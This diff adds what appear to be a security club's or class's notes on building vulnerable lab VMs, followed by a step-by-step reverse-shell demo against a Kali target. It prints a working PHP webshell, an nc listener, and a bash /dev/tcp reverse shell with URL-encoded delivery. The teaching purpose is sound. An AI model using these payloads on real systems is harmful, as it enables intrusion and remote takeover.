@@ -1,0 +1,75 @@
+Jan. 17, 2024
+
+Presentation strengths
+- show the code
+- clear demo: noral behavior + bad behavior
+- multi-modal explanations
+-- here's the code
+-- here's what happens
+-- here's an explanation of what happened
+- how to fix/avoid the issue
+
+Monday:
+- create a linux vm (ubuntu whatever)
+- introduce a vulnerability to the vm
+- if the vm and local machine are on the same network, want attacker to find vulnerability and exploit
+-- ex. run port, find port used, see what version of apache is being used, if apache is running go to site and do a vulnerability
+- export vm and share it
+- not super ambitious vm but to the point where we can export and share it
+
+Wednesday:
+- want machines to be multi-step
+- want machines to be interesting enough such that we can do a write-up
+- dive into a topic that is interesting 
+
+Monday to Wednesday:
+- attack other ppl's vm
+
+Future topics:
+- General pen testing methodology
+- reverse shells 
+- publicly available exploits and how to find them
+- ...
+
+what does pre do? preserves the whitespace in the original text and outputs it exactly as is to the browser
+
++ The Demo of a Reverse Shell That Jeff Couldn't Get to Work
+    Until 3 Minutes After Returning to his Office
+
+Step 0: set up your Target
+- I used Kali as my target, with Apache as my web server
+
+Step 1: put a webshell on the Target's website
+- Here's my webshell.php
+<pre>                                                                          
+<?php                                                                          
+    if (isset($_REQUEST['command'])) {                                         
+        system($_REQUEST['command']);                                          
+    }                                                                          
+?>                                                                             
+</pre>
+
+Step 3: test the webshell from your Attacker (e.g., my Mac terminal or browser)
+
+    http://IP_OF_KALI/webshell.php?command=whoami
+
+Step 4: launch a listener on your Attacker
+
+    nc -lvnp 4444
+
+Step 5: use the web shell to run this:
+
+    bash -c "bash -i >& /dev/tcp/172.16.41.1/4444 0>&1"
+
+but note that ampersands are very special in URLs, so you need to "url-encode" them. Also, spaces in URLs cause trouble. So this needs to be:
+
+    bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/172.16.41.1/4444%200>%261"
+
+So, use this URL in either a browser or curl
+
+    http://IP_OF_KALI/webshell.php?command=bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/172.16.41.1/4444%200>%261"
+
+Step 6: look back at your nc listener; got a shell on the Target?
+
+LAST QUESTION: WTH is going on here? How does all this craziness work?
+
